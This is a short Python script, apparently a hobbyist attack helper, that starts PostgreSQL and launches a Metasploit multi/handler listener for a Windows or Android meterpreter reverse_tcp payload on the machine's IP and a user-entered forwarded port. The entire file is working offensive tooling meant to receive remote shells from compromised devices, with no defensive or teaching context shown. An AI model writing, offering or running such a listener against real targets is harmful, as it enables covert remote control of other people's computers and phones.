import os
import socket
print("[1] msf meterpreter listener")
print("[0] Exit ")
print("""


""")
listener=int(input("Enter the choice : "))
ip=socket.gethostbyname(socket.gethostname())
port=int(input("Enter LPORT (which is forwarded): "))
if listener==1:
	os.system("service postgresql start")
	op=input("ENTER THE PAYLOAD FOR (windows or android): ")
	os.system(f"msfconsole -x 'use exploit/multi/handler; set lhost {ip}; set lport {port}; set payload {op}/meterpreter/reverse_tcp; exploit'")
else:
	print("Exiting ,,,BYE BYE>>>>>>>")

